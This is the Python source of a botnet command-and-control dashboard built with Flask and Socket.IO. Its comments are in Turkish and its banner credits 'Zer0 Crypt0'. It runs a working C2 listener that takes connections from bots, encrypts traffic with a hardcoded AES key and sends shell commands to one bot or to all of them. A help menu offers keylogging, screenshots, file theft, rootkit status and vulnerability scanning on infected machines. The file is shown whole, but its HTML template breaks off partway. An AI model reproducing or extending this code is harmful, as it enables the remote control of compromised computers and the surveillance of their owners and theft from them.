#!/usr/bin/env python3
from flask import Flask, render_template, jsonify, request, redirect, url_for
from flask_socketio import SocketIO, emit
import logging
import json
import time
import os
import threading
from datetime import datetime
import socket
import queue
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Random import get_random_bytes

app = Flask(__name__)
app.config['SECRET_KEY'] = 'botnet_dashboard_secret_2025'
socketio = SocketIO(app, cors_allowed_origins="*")

# Jinja filtreleri
@app.template_filter('datetime')
def format_datetime(ts):
    try:
        return datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return '-'

# Global değişkenler (Server.py'den alınacak)
bots_data = {}
p2p_status = {}
wireshark_alerts = {}
# Ek görünümler için veriler
bot_vulnerabilities = {}
platform_stats = {}
server_info = {
    'host': '0.0.0.0',
    'port': 8080,
    'active_bots': 0,
    'uptime': time.time(),
    'ipv6_enabled': socket.has_ipv6,
    'security_rules_enabled': True,
    'p2p_port_range': (49152, 65535)
}

# Real-time terminal için
command_queue = queue.Queue()
response_queue = queue.Queue()
server_instance = None
terminal_sessions = {}

# ==================== LOCAL BACKUP C2 (when Server.py inactive) ====================

# Shared encryption key (must match Net.py/Server.py derivation)
ENCRYPTION_KEY = hashlib.sha256(b"SecretBotNetKey2025").digest()

def encrypt_c2_gcm(data: bytes) -> bytes:
    if isinstance(data, str):
        data = data.encode('utf-8')
    nonce = get_random_bytes(12)
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + ciphertext + tag

def decrypt_c2_auto(payload: bytes) -> str:
    # Try GCM first (nonce + ciphertext + tag)
    try:
        if len(payload) >= 12 + 16:
            nonce = payload[:12]
            tag = payload[-16:]
            ciphertext = payload[12:-16]
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_GCM, nonce=nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)
            return data.decode('utf-8')
        raise ValueError("too short for GCM")
    except Exception:
        # CBC fallback (IV + ciphertext)
        try:
            iv = payload[:16]
            actual = payload[16:]
            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(actual), AES.block_size).decode('utf-8')
        except Exception:
            return ''

class LocalC2:
    def __init__(self, host='0.0.0.0', port=8080):
        self.host = host
        self.port = port
        self.sock = None
        self.alive = False
        self.bots = {}  # bot_id -> { conn, addr, last_seen, platform, response_event, last_output }
        self.lock = threading.Lock()

    def start(self):
        if self.alive:
            return
        self.alive = True
        t = threading.Thread(target=self._run, daemon=True)
        t.start()

    def _run(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(50)
            print(f"[WEB-C2] Listening for bots on {self.host}:{self.port}")
            while self.alive:
                try:
                    conn, addr = self.sock.accept()
                    threading.Thread(target=self._handle_bot, args=(conn, addr), daemon=True).start()
                except Exception:
                    continue
        except Exception as e:
            print(f"[WEB-C2] Listener error: {e}")

    def _handle_bot(self, conn: socket.socket, addr):
        bot_id = None
        try:
            conn.settimeout(5)
            # Initial registration
            first = conn.recv(4096)
            if not first:
                conn.close(); return
            try:
                msg = json.loads(decrypt_c2_auto(first))
            except Exception:
                msg = {}
            bot_id = msg.get('bot_id') or f"{addr[0]}:{addr[1]}"
            platform = msg.get('platform', 'Unknown')
            with self.lock:
                self.bots[bot_id] = {
                    'conn': conn,
                    'addr': addr,
                    'last_seen': time.time(),
                    'platform': platform,
                    'response_event': threading.Event(),
                    'last_output': None,
                }
            # Update UI cache
            bots_data[bot_id] = {
                'ip': addr[0],
                'last_seen': time.time(),
                'platform': platform,
                'active': True,
            }

            # send minimal registration ack
            try:
                ack = json.dumps({'status': 'registered', 'ipv6_enabled': socket.has_ipv6}).encode()
                conn.sendall(encrypt_c2_gcm(ack))
            except Exception:
                pass

            # Main loop receive
            while self.alive:
                try:
                    data = conn.recv(65535)
                    if not data:
                        break
                    text = decrypt_c2_auto(data)
                    if not text:
                        continue
                    obj = json.loads(text)
                    # heartbeat
                    if obj.get('action') == 'heartbeat':
                        with self.lock:
                            if bot_id in self.bots:
                                self.bots[bot_id]['last_seen'] = time.time()
                        bots_data.get(bot_id, {}).update({'last_seen': time.time()})
                        continue
                    # command result
                    if obj.get('action') == 'command_result':
                        out = obj.get('output', 'No output')
                        with self.lock:
                            if bot_id in self.bots:
                                self.bots[bot_id]['last_output'] = out
                                self.bots[bot_id]['response_event'].set()
                        # push to any active terminal sessions
                        socketio.emit('terminal_output', {
                            'type': 'success',
                            'message': f"✅ {bot_id} yanıtı:\n{out}",
                            'timestamp': time.time()
                        })
                        continue
                    # generic output
                    if 'output' in obj:
                        out = obj.get('output')
                        with self.lock:
                            if bot_id in self.bots:
                                self.bots[bot_id]['last_output'] = out
                                self.bots[bot_id]['response_event'].set()
                        socketio.emit('terminal_output', {
                            'type': 'info',
                            'message': f"📄 {bot_id}: {out}",
                            'timestamp': time.time()
                        })
                        continue
                except socket.timeout:
                    continue
                except Exception:
                    break
        finally:
            try:
                conn.close()
            except Exception:
                pass
            if bot_id:
                with self.lock:
                    self.bots.pop(bot_id, None)
                if bot_id in bots_data:
                    bots_data[bot_id]['active'] = False

    def send_command(self, bot_id: str, command: str, timeout: float = 15.0):
        with self.lock:
            entry = self.bots.get(bot_id)
        if not entry:
            return False, f"Bot not found: {bot_id}"
        try:
            payload = {
                'bot_id': bot_id,
                'action': 'execute',
                'command': command,
                'silent': False
            }
            entry['response_event'].clear()
            entry['conn'].sendall(encrypt_c2_gcm(json.dumps(payload)))
            # wait for response
            if entry['response_event'].wait(timeout):
                with self.lock:
                    out = self.bots.get(bot_id, {}).get('last_output')
                return True, out
            return False, 'Timeout waiting for response'
        except Exception as e:
            return False, str(e)

local_c2 = None

def get_banner():
    """Server.py'den banner'ı al"""
    return r"""
            [Flexible and Powerful Botnet Tool]
  ___   __    ______   _________         ______   _____       
 /__/\ /__/\ /_____/\ /________/\       /_____/\ /_____/\     
 \::\_\\  \ \\::::_\/_\__....__\/_______\:::__\/ \:::_:\ \    
  \:. `-\  \ \\:\/___/\  \::\ \ /______/\\:\ \  __   _\:\|    
   \:. _    \ \\::___\/_  \::\ \\__::::\/ \:\ \/_/\ /::_/__   
    \. \`-\  \ \\:\____/\  \::\ \          \:\_\ \ \\:\____/\ 
     \__\/ \__\/ \_____\/   \__\/           \_____\/ \_____\/ 
                                By: Zer0 Crypt0
                                     version: 1.0
        """

@app.route('/')
def dashboard():
    """Ana dashboard sayfası"""
    return render_template('dashboard.html', 
                         banner=get_banner(),
                         server_info=server_info,
                         bots=bots_data,
                         p2p_status=p2p_status,
                         alerts=wireshark_alerts)

@app.route('/api/bots')
def api_bots():
    """Bot listesi API endpoint'i"""
    return jsonify({
        'bots': bots_data,
        'total': len(bots_data),
        'active': len([b for b in bots_data.values() if b.get('active', False)])
    })

@app.route('/api/p2p')
def api_p2p():
    """P2P durumu API endpoint'i"""
    return jsonify({
        'p2p_status': p2p_status,
        'active_p2p': len([s for s in p2p_status.values() if s.get('status') == 'active'])
    })

@app.route('/api/alerts')
def api_alerts():
    """Güvenlik uyarıları API endpoint'i"""
    return jsonify({
        'alerts': wireshark_alerts,
        'total_alerts': len(wireshark_alerts)
    })

@app.route('/api/server')
def api_server():
    """Sunucu bilgileri API endpoint'i"""
    return jsonify({
        'server_info': server_info,
        'uptime_seconds': int(time.time() - server_info['uptime'])
    })

@app.route('/api/vulns')
def api_vulns():
    """Zafiyet özeti API endpoint'i"""
    # Platform bazlı özet hazırla
    platforms = {}
    for platform, stats in platform_stats.items():
        platforms[platform] = {
            'total': stats.get('count', 0),
            'high_severity': stats.get('high_severity', 0),
            'exploits_available': stats.get('exploits_available', 0)
        }

    per_bot_counts = {
        bot_id: len(vulns) for bot_id, vulns in bot_vulnerabilities.items()
    }

    return jsonify({
        'total_bots_scanned': len(bot_vulnerabilities),
        'total_vulnerabilities': sum(len(v) for v in bot_vulnerabilities.values()),
        'platforms': platforms,
        'per_bot_counts': per_bot_counts
    })

@app.route('/api/downloads')
def api_downloads():
    """Son indirme kayıtları API endpoint'i"""
    try:
        downloads_root = 'downloads'
        entries = []
        if os.path.exists(downloads_root):
            for bot_id in os.listdir(downloads_root):
                bot_dir = os.path.join(downloads_root, bot_id)
                if not os.path.isdir(bot_dir):
                    continue
                log_file = os.path.join(bot_dir, 'download_log.json')
                if os.path.exists(log_file):
                    try:
                        with open(log_file, 'r') as f:
                            logs = json.load(f)
                            for item in logs:
                                item['bot_id'] = bot_id
                                entries.append(item)
                    except Exception:
                        continue
        # En yeni 20 kayıt
        entries.sort(key=lambda x: x.get('timestamp', 0), reverse=True)
        return jsonify({'success': True, 'downloads': entries[:20]})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/tor')
def api_tor():
    """Tor durumu API endpoint'i"""
    return jsonify({
        'tor_enabled': server_info.get('tor_enabled', False),
        'tor_bots': len([b for b in bots_data.values() if b.get('tor_enabled', False)]),
        'clearnet_bots': len([b for b in bots_data.values() if not b.get('tor_enabled', False)])
    })

@app.route('/api/command', methods=['POST'])
def send_command():
    """Komut gönderme API endpoint'i"""
    data = request.get_json()
    bot_id = data.get('bot_id')
    command = data.get('command')
    
    if not bot_id or not command:
        return jsonify({'error': 'Bot ID ve komut gerekli'}), 400
    
    print(f"[WEB] Komut gönderildi: {bot_id} -> {command}")
    
    # Server instance üzerinden komut gönder
    if server_instance and hasattr(server_instance, 'send_command'):
        try:
            success = server_instance.send_command(bot_id, command)
            if success:
                return jsonify({
                    'success': True,
                    'message': f'Komut {bot_id} botuna gönderildi',
                    'command': command,
                    'timestamp': time.time()
                })
            else:
                return jsonify({
                    'success': False,
                    'error': f'Bot {bot_id} bulunamadı veya komut gönderilemedi'
                }), 404
        except Exception as e:
            return jsonify({
                'success': False,
                'error': f'Komut gönderme hatası: {str(e)}'
            }), 500
    
    # Local C2 fallback
    elif local_c2:
        try:
            success, response = local_c2.send_command(bot_id, command)
            return jsonify({
                'success': success,
                'message': response if success else f'Hata: {response}',
                'command': command,
                'timestamp': time.time()
            })
        except Exception as e:
            return jsonify({
                'success': False,
                'error': f'Local C2 hatası: {str(e)}'
            }), 500
    
    return jsonify({
        'success': False,
        'error': 'Server instance bulunamadı'
    }), 503

@app.route('/api/broadcast', methods=['POST'])
def broadcast_command():
    """Tüm botlara komut gönderme"""
    data = request.get_json()
    command = data.get('command')
    
    if not command:
        return jsonify({'error': 'Komut gerekli'}), 400
    
    # Broadcast komut gönderme
    print(f"[WEB] Broadcast komut: {command}")
    
    return jsonify({
        'success': True,
        'message': f'Komut {len(bots_data)} botuna gönderildi',
        'command': command,
        'timestamp': time.time()
    })

@app.route('/api/network_maps')
def api_network_maps():
    """Network maps durumu API endpoint'i"""
    return jsonify({
        'network_maps': server_info.get('network_maps', {}),
        'total_maps': len(server_info.get('network_maps', {})),
        'enabled': server_info.get('network_maps_enabled', False)
    })

@app.route('/api/network_map/<bot_id>')
def api_network_map_detail(bot_id):
    """Belirli bir bot'un network map detayları"""
    network_maps = server_info.get('network_maps', {})
    if bot_id in network_maps:
        return jsonify({
            'success': True,
            'map_data': network_maps[bot_id]
        })
    else:
        return jsonify({
            'success': False,
            'error': 'Network map bulunamadı'
        }), 404

# ==================== WEBSOCKET TERMINAL ====================

@socketio.on('connect')
def handle_connect():
    """WebSocket bağlantısı kurulduğunda"""
    session_id = request.sid
    terminal_sessions[session_id] = {
        'connected': True,
        'start_time': time.time()
    }
    emit('terminal_output', {
        'type': 'system',
        'message': f'🟢 Terminal connected - Session: {session_id[:8]}...',
        'timestamp': time.time()
    })
    
    # Mevcut botları listele
    if bots_data:
        bot_list = "\n".join([f"  • {bot_id} ({bot.get('ip', 'N/A')})" for bot_id, bot in bots_data.items()])
        emit('terminal_output', {
            'type': 'info',
            'message': f'📡 Connected Bots ({len(bots_data)}):\n{bot_list}',
            'timestamp': time.time()
        })

@socketio.on('disconnect')
def handle_disconnect():
    """WebSocket bağlantısı kesildiğinde"""
    session_id = request.sid
    if session_id in terminal_sessions:
        del terminal_sessions[session_id]

@socketio.on('terminal_command')
def handle_terminal_command(data):
    """Terminal komutunu işle"""
    try:
        command = data.get('command', '').strip()
        bot_id = data.get('bot_id', '').strip()
        session_id = request.sid
        
        if not command:
            emit('terminal_output', {
                'type': 'error',
                'message': '❌ Komut boş olamaz',
                'timestamp': time.time()
            })
            return
        
        # Sistem komutları
        if command.lower() in ['list', 'bots', 'ls']:
            handle_list_command()
            return
        elif command.lower() in ['help', '?']:
            handle_help_command()
            return
        elif command.lower() in ['clear', 'cls']:
            emit('terminal_clear')
            return
        elif command.lower().startswith('status'):
            handle_status_command(command)
            return
        
        # Bot komutları
        if not bot_id:
            emit('terminal_output', {
                'type': 'error',
                'message': '❌ Bot ID gerekli. Kullanım: bot <bot_id> <command>',
                'timestamp': time.time()
            })
            return
        
        # Komutu server'a veya local backup C2'ye gönder
        if server_instance and hasattr(server_instance, 'send_command_to_bot'):
            emit('terminal_output', {
                'type': 'info',
                'message': f'📤 Komut gönderiliyor: {bot_id} -> {command}',
                'timestamp': time.time()
            })
            
            # Komut gönder ve sonucu bekle
            threading.Thread(target=execute_bot_command, args=(bot_id, command, session_id)).start()
        elif local_c2:
            emit('terminal_output', {
                'type': 'info',
                'message': f'📤 (WEB-C2) Komut gönderiliyor: {bot_id} -> {command}',
                'timestamp': time.time()
            })
            def _runner():
                ok, res = local_c2.send_command(bot_id, command)
                socketio.emit('terminal_output', {
                    'type': 'success' if ok else 'error',
                    'message': f'{"✅" if ok else "❌"} {bot_id} yanıtı:\n{res}',
                    'timestamp': time.time()
                }, room=session_id)
            threading.Thread(target=_runner, daemon=True).start()
        else:
            emit('terminal_output', {
                'type': 'error',
                'message': '❌ Server instance bulunamadı ve WEB-C2 devre dışı',
                'timestamp': time.time()
            })
            
    except Exception as e:
        emit('terminal_output', {
            'type': 'error',
            'message': f'❌ Komut işleme hatası: {str(e)}',
            'timestamp': time.time()
        })

def handle_list_command():
    """Bot listesi komutunu işle"""
    if not bots_data:
        emit('terminal_output', {
            'type': 'warning',
            'message': '⚠️ Hiç bot bağlı değil',
            'timestamp': time.time()
        })
        return
    
    output = f"📡 Bağlı Botlar ({len(bots_data)}):\n"
    output += "=" * 50 + "\n"
    
    for bot_id, bot in bots_data.items():
        ip = bot.get('ip', 'N/A')
        last_seen = bot.get('last_seen', 0)
        platform = bot.get('platform', 'Unknown')
        
        # Son görülme zamanı
        if last_seen:
            time_diff = int(time.time() - last_seen)
            if time_diff < 60:
                last_seen_str = f"{time_diff}s ago"
            elif time_diff < 3600:
                last_seen_str = f"{time_diff//60}m ago"
            else:
                last_seen_str = f"{time_diff//3600}h ago"
        else:
            last_seen_str = "Never"
        
        # P2P durumu
        p2p_status_str = "Unknown"
        if bot_id in p2p_status:
            p2p_status_str = p2p_status[bot_id].get('status', 'Unknown')
        
        output += f"🤖 {bot_id}\n"
        output += f"   📍 IP: {ip}\n"
        output += f"   💻 Platform: {platform}\n"
        output += f"   🕐 Last Seen: {last_seen_str}\n"
        output += f"   🔗 P2P: {p2p_status_str}\n"
        output += "-" * 30 + "\n"
    
    emit('terminal_output', {
        'type': 'success',
        'message': output,
        'timestamp': time.time()
    })

def handle_help_command():
    """Yardım komutunu işle"""
    help_text = """
🔧 Terminal Komutları:
==================

📋 Sistem Komutları:
  • list, bots, ls     - Bağlı botları listele
  • status             - Genel sistem durumu
  • help, ?            - Bu yardım mesajını göster
  • clear, cls         - Terminal ekranını temizle

🤖 Bot Komutları:
  Kullanım: <bot_id> <komut>
  
  Örnek komutlar:
  • sysinfo            - Sistem bilgileri
  • screenshot         - Ekran görüntüsü al
  • keylogger start    - Keylogger başlat
  • keylogger stop     - Keylogger durdur
  • download <file>    - Dosya indir
  • upload <file>      - Dosya yükle
  • shell <cmd>        - Shell komutu çalıştır
  • rootkit_status     - Rootkit durumu
  • network_map start  - Network mapping başlat
  • vuln_scan          - Zafiyet taraması

💡 İpucu: Önce 'list' komutu ile botları görün, sonra bot_id ile komut gönderin.
"""
    
    emit('terminal_output', {
        'type': 'info',
        'message': help_text,
        'timestamp': time.time()
    })

def handle_status_command(command):
    """Status komutunu işle"""
    status_info = f"""
🖥️ Server Status:
================
• Active Bots: {len(bots_data)}
• P2P Networks: {len(p2p_status)}
• Security Alerts: {len(wireshark_alerts)}
• Uptime: {int(time.time() - server_info['uptime'])}s
• Terminal Sessions: {len(terminal_sessions)}

📊 Platform Distribution:
"""
    
    # Platform dağılımı
    platforms = {}
    for bot in bots_data.values():
        platform = bot.get('platform', 'Unknown')
        platforms[platform] = platforms.get(platform, 0) + 1
    
    for platform, count in platforms.items():
        status_info += f"• {platform}: {count}\n"
    
    emit('terminal_output', {
        'type': 'info',
        'message': status_info,
        'timestamp': time.time()
    })

def execute_bot_command(bot_id, command, session_id):
    """Bot komutunu çalıştır ve sonucu döndür"""
    try:
        if bot_id not in bots_data:
            socketio.emit('terminal_output', {
                'type': 'error',
                'message': f'❌ Bot bulunamadı: {bot_id}',
                'timestamp': time.time()
            }, room=session_id)
            return
        
        # Server instance üzerinden komut gönder
        if server_instance and hasattr(server_instance, 'bots') and bot_id in server_instance.bots:
            try:
                # Komutu gönder
                result = server_instance.send_command_to_bot(bot_id, command)
                
                if result:
                    socketio.emit('terminal_output', {
                        'type': 'success',
                        'message': f'✅ {bot_id} yanıtı:\n{result}',
                        'timestamp': time.time()
                    }, room=session_id)
                else:
                    socketio.emit('terminal_output', {
                        'type': 'warning',
                        'message': f'⚠️ {bot_id} yanıt vermedi',
                        'timestamp': time.time()
                    }, room=session_id)
                    
            except Exception as e:
                socketio.emit('terminal_output', {
                    'type': 'error',
                    'message': f'❌ Komut hatası: {str(e)}',
                    'timestamp': time.time()
                }, room=session_id)
        else:
            socketio.emit('terminal_output', {
                'type': 'error',
                'message': f'❌ Bot bağlantısı bulunamadı: {bot_id}',
                'timestamp': time.time()
            }, room=session_id)
            
    except Exception as e:
        socketio.emit('terminal_output', {
            'type': 'error',
            'message': f'❌ Komut çalıştırma hatası: {str(e)}',
            'timestamp': time.time()
        }, room=session_id)

# Template klasörü oluştur
os.makedirs('templates', exist_ok=True)

# HTML template oluştur
dashboard_html = '''<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Botnet Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a1f 50%, #2d1b3e 100%);
            min-height: 100vh;
            font-family: 'Orbitron', monospace;
            color: #E040FB;
        }
        
        .banner {
            background: rgba(0,0,0,0.9);
            color: #E040FB;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 30px;
            white-space: pre;
            font-size: 12px;
            overflow-x: auto;
            border: 2px solid #E040FB;
            box-shadow: 0 0 20px rgba(224,64,251,0.6);
            font-family: 'Courier New', monospace;
            line-height: 1.2;
            text-align: center;
        }
        
        .card {
            background: rgba(20, 20, 35, 0.95);
            border: 2px solid #BA68C8;
            border-radius: 15px;
            box-shadow: 0 8px 32px rgba(186,104,200,0.4);
            backdrop-filter: blur(10px);
            color: #E040FB;
        }
        
        .card-header {
            background: linear-gradient(45deg, #E040FB, #9C27B0);
            color: #fff;
            border-radius: 13px 13px 0 0 !important;
            font-weight: bold;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
        }
        
        .status-active { color: #E040FB; text-shadow: 0 0 10px #E040FB; }
        .status-inactive { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
        .status-warning { color: #ffaa00; text-shadow: 0 0 10px #ffaa00; }
        
        .bot-card {
            transition: all 0.3s ease;
            border: 1px solid #BA68C8;
        }
        
        .bot-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(224,64,251,0.7);
            border-color: #E040FB;
        }
        
        .command-input {
            background: rgba(0,0,0,0.8);
            border: 2px solid #BA68C8;
            border-radius: 10px;
            color: #E040FB;
            font-family: 'Orbitron', monospace;
        }
        
        .command-input:focus {
            background: rgba(0,0,0,0.9);
            border-color: #E040FB;
            box-shadow: 0 0 15px rgba(224,64,251,0.6);
            color: #E040FB;
        }
        
        .btn-custom {
            background: linear-gradient(45deg, #E040FB, #9C27B0);
            border: none;
            border-radius: 10px;
            color: #fff;
            font-weight: bold;
            font-family: 'Orbitron', monospace;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
            transition: all 0.3s ease;
        }
        
        .btn-custom:hover {
            background: linear-gradient(45deg, #9C27B0, #E040FB);
            color: #fff;
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(224,64,251,0.7);
        }
        
        .stats-card {
            background: linear-gradient(45deg, #E040FB, #9C27B0);
            color: #fff;
            border: 2px solid #E040FB;
            box-shadow: 0 0 20px rgba(224,64,251,0.6);
        }
        
        .stats-card:hover {
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(224,64,251,0.8);
        }
        
        .alert {
            background: rgba(255, 170, 0, 0.1);
            border: 1px solid #ffaa00;
            color: #ffaa00;
        }

        /* Severity rozetleri */
        .sev-critical { color: #ff4d4d; font-weight: 700; }
        .sev-high { color: #ff884d; font-weight: 700; }
        .sev-medium { color: #ffd24d; font-weight: 700; }
        .sev-low { color: #4dff88; font-weight: 700; }
        .sev-badge { border: 1px solid currentColor; padding: 2px 6px; border-radius: 6px; }
        
        .form-label {
            color: #E040FB;
            font-weight: bold;
            text-shadow: 0 0 5px #E040FB;
        }
        
        .text-muted {
            color: #BA68C8 !important;
        }
        
        /* Animasyonlar */
        @keyframes glow {
            0% { box-shadow: 0 0 5px #E040FB; }
            50% { box-shadow: 0 0 20px #E040FB, 0 0 30px #E040FB; }
            100% { box-shadow: 0 0 5px #E040FB; }
        }
        
        .glow {
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: #1a1a2e;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #BA68C8;
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #E040FB;
        }
        
        /* Loading animasyonu */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(224,64,251,.3);
            border-radius: 50%;
            border-top-color: #E040FB;
            animation: spin 1s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Terminal efekti */
        .terminal-text {
            font-family: 'Courier New', monospace;
            background: rgba(0,0,0,0.8);
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #BA68C8;
        }
        
        /* Terminal özel stilleri */
        .terminal-prompt {
            background: rgba(224,64,251,0.2);
            border: 1px solid #E040FB;
            color: #E040FB;
            font-family: 'Courier New', monospace;
            font-weight: bold;
        }
        
        .terminal-line {
            margin: 5px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.4;
            white-space: pre-wrap;
        }
        
        .terminal-line.system { color: #E040FB; }
        .terminal-line.info { color: #00bfff; }
        .terminal-line.success { color: #E040FB; }
        .terminal-line.warning { color: #ffaa00; }
        .terminal-line.error { color: #ff4444; }
        
        #terminal-output {
            background: rgba(0,0,0,0.9);
            border: 2px solid #E040FB;
            border-radius: 8px;
            color: #E040FB;
        }
        
        #terminal-input {
            font-family: 'Courier New', monospace;
        }
        
        /* Pulse efekti */
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container-fluid py-4">
        <!-- Banner -->
        <div class="banner text-center glow">
            {{ banner }}
        </div>
        
        <!-- Server Stats -->
        <div class="row mb-4">
            <div class="col-md-3">
                <div class="card stats-card">
                    <div class="card-body text-center">
                        <i class="fas fa-server fa-2x mb-2"></i>
                        <h5>Active Bots</h5>
                        <h3 id="active-bots" class="pulse">{{ server_info.active_bots }}</h3>
                    </div>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card stats-card">
                    <div class="card-body text-center">
                        <i class="fas fa-shield-alt fa-2x mb-2"></i>
                        <h5>Security Alerts</h5>
                        <h3 id="security-alerts" class="pulse">{{ alerts|length }}</h3>
                    </div>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card stats-card">
                    <div class="card-body text-center">
                        <i class="fas fa-network-wired fa-2x mb-2"></i>
                        <h5>P2P Networks</h5>
                        <h3 id="p2p-networks" class="pulse">{{ p2p_status|length }}</h3>
                    </div>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card stats-card">
                    <div class="card-body text-center">
                        <i class="fas fa-clock fa-2x mb-2"></i>
                        <h5>Uptime</h5>
                        <h3 id="uptime" class="pulse">--:--:--</h3>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Command Panel -->
        <div class="row mb-4">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-terminal me-2"></i>Single Bot Command
                    </div>
                    <div class="card-body">
                        <div class="mb-3">
                            <label class="form-label">Bot ID:</label>
                            <select class="form-select command-input" id="bot-select">
                                <option value="">Select Bot...</option>
                                {% for bot_id, bot in bots.items() %}
                                <option value="{{ bot_id }}">{{ bot_id }} ({{ bot.ip }})</option>
                                {% endfor %}
                            </select>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">Command:</label>
                            <input type="text" class="form-control command-input" id="single-command" placeholder="Enter command...">
                        </div>
                        <button class="btn btn-custom" onclick="sendSingleCommand()">
                            <i class="fas fa-paper-plane me-2"></i>Send Command
                        </button>
                    </div>
                </div>
            </div>
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-broadcast-tower me-2"></i>Broadcast Command
                    </div>
                    <div class="card-body">
                        <div class="mb-3">
                            <label class="form-label">Command:</label>
                            <input type="text" class="form-control command-input" id="broadcast-command" placeholder="Enter broadcast command...">
                        </div>
                        <button class="btn btn-custom" onclick="sendBroadcastCommand()">
                            <i class="fas fa-broadcast-tower me-2"></i>Broadcast
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Bots List -->
        <div class="row">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-robot me-2"></i>Connected Bots
                    </div>
                    <div class="card-body">
                        <div class="row" id="bots-container">
                            {% for bot_id, bot in bots.items() %}
                            <div class="col-md-6 mb-3">
                                <div class="card bot-card">
                                    <div class="card-body">
                                        <h6 class="card-title">{{ bot_id }}</h6>
                                        <p class="card-text">
                                            <small class="text-muted">
                                                <i class="fas fa-map-marker-alt me-1"></i>{{ bot.ip }}<br>
                                                <i class="fas fa-clock me-1"></i>{{ bot.last_seen|datetime }}<br>
                                                <i class="fas fa-network-wired me-1"></i>
                                                P2P: 
                                                {% if bot_id in p2p_status %}
                                                    <span class="status-{{ p2p_status[bot_id].status }}">{{ p2p_status[bot_id].status }}</span>
                                                {% else %}
                                                    <span class="status-inactive">unknown</span>
                                                {% endif %}<br>
                                                <i class="fas fa-shield-alt me-1"></i>
                                                Security: 
                                                {% if bot_id in alerts %}
                                                    <span class="status-warning">Alert</span>
                                                {% else %}
                                                    <span class="status-active">Clean</span>
                                                {% endif %}
                                            </small>
                                        </p>
                                    </div>
                                </div>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Alerts Panel -->
            <div class="col-md-4">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-exclamation-triangle me-2"></i>Security Alerts
                    </div>
                    <div class="card-body">
                        <div id="alerts-container">
                            {% for bot_id, alert in alerts.items() %}
                            <div class="alert">
                                <strong>{{ bot_id }}</strong><br>
                                <small>{{ alert.message }}</small><br>
                                <small class="text-muted">{{ alert.timestamp|datetime }}</small>
                            </div>
                            {% endfor %}
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Vulnerabilities & Downloads -->
        <div class="row mt-4">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header">
                        <i class="fas fa-bug me-2"></i>Vulnerability Summary
                    </div>
                    <div class="card-body">
                        <div class="row mb-3">
                            <div class="col-md-4">
                                <div class="card stats-card">
                                    <div class="card-body text-center">
                                        <i class="fas fa-list-ol fa-2x mb-2"></i>
                                        <h6>Total Vulnerabilities</h6>
                                        <h4 id="vuln-total" class="pulse">0</h4>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="card stats-card">
                                    <div class="card-body text-center">
                                        <i class="fas fa-fire fa-2x mb-2"></i>
                                        <h6>High / Critical</h6>
                                        <h4 id="vuln-high" class="pulse">0</h4>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="card stats-card">
                                    <div class="card-body text-center">
                                        <i class="fas fa-microchip fa-2x mb-2"></i>
                                        <h6>Bots Scanned</h6>
                                        <h4 id="vuln-bots" class="pulse">0</h4>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-7">
                                <div class="terminal-text" style="max-height:300px; overflow:auto;">
                                    <h6 class="mb-2">By Platform</h6>
                                    <div id="vuln-platforms"></div>
                                </div>
                            </div>
                            <div class="col-md-5">
